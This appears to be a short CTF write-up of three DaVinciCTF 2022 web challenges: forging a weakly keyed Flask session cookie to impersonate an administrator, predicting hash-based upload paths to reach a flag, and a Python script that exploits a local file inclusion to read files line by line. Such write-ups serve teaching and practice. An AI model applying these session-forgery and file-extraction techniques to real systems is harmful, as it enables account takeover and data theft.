# Davincictf-22 web writeups

ctf link : [https://dvc.tf/](https://dvc.tf/)

# CyberStreak v1.0

- create account 

![https://i.imgur.com/1F7r7wh.png](https://i.imgur.com/1F7r7wh.png)

- login 

![https://i.imgur.com/vUBCGd9.png](https://i.imgur.com/vUBCGd9.png)

- after successfull login you will find flask session 

![https://i.imgur.com/jzxFNFc.png](https://i.imgur.com/jzxFNFc.png)

- try to find if this flask session is suffering from weak key i use this [tool](https://pypi.org/project/flask-unsign/).
  
![https://i.imgur.com/j6HvuiD.png](https://i.imgur.com/j6HvuiD.png)

- hence ,right we can now forge any token and can get unauthorized access to any user account, but question is who ? , than i tried admin nothing comes.
- we can see author tip us off with username of administrator.

![https://i.imgur.com/JaOe4uf.png](https://i.imgur.com/JaOe4uf.png)

- try to access  `xXx-michel-xXx` by forging flask token.

![https://i.imgur.com/z6lPDah.png](https://i.imgur.com/z6lPDah.png)

- and we get [flag](https://github.com/Ryn0K/CTFs/blob/master/davincictf-22/web/CyberStreak-v1.0/flag.txt)

![https://i.imgur.com/PY6Byub.png](https://i.imgur.com/PY6Byub.png)

# CyberStreak v2.0

- same username given i think we need to play with this again, this type weak key for flask session is fixed.

![https://i.imgur.com/zjscNKx.png](https://i.imgur.com/zjscNKx.png)

- we can now upload our own challenges now try to play with `picture` we can upload, after analysing and guessing we can conclude this.

![https://i.imgur.com/V14zELS.png](https://i.imgur.com/V14zELS.png)

- in order to get flag we need to do this,consider using previous challenge flag file name ``

![https://i.imgur.com/jQ9YE21.png](https://i.imgur.com/jQ9YE21.png)

`sha256('xXx-michel-xXx')/md5('flaggggggggggggggggggggggg.png2')` = `ffc2e03c7152165f02a4cca8fe426f9f0f8c9ea4a02a2077ecaeb4fdfeeed92e/7e0c7ec9c02bffca0ff9a9dc26f02f5b` 

- and by navigating [http://challs.dvc.tf:5002/uploaded_images/ffc2e03c7152165f02a4cca8fe426f9f0f8c9ea4a02a2077ecaeb4fdfeeed92e/7e0c7ec9c02bffca0ff9a9dc26f02f5b](http://challs.dvc.tf:5002/uploaded_images/ffc2e03c7152165f02a4cca8fe426f9f0f8c9ea4a02a2077ecaeb4fdfeeed92e/7e0c7ec9c02bffca0ff9a9dc26f02f5b) we can get flag.

![https://i.imgur.com/kfA8p7S.png](https://i.imgur.com/kfA8p7S.png)


# davinci playlist : part 1

![https://i.imgur.com/DXJ30Pb.png](https://i.imgur.com/DXJ30Pb.png)

- this series has 3 challenges, i am only going to cover only web part another part is just boot2root.

- we have `lfi` here but due to logic we can only get data from file line by line by providing get parameters.

- i use this [exploit](https://github.com/Ryn0K/CTFs/blob/master/davincictf-22/web/davinci-playlist/extract.py) to `fetch` any file i can 

```py
#!/usr/bin/env python3
from requests import get
import sys
from bs4 import BeautifulSoup as bs
i=1
while True:
  try:
    r = get(f'http://challs.dvc.tf:51080/?MyTop5={i}&playlistTop={sys.argv[1]}')
    if(r.status_code == 200):
      soup = bs(r.text,'lxml')
      iframe=soup.findAll('iframe')[0]
      print(iframe['src'].replace('http://www.youtube.com/embed/',''))
    i+=1
  except KeyboardInterrupt:
    break
```

- output

![https://i.imgur.com/iGGUV0w.png](https://i.imgur.com/iGGUV0w.png)


# Final note

ctf challenges of this ctf are not so good , just little bit guessing not any technical things, anyway we enjoy thanks to author.
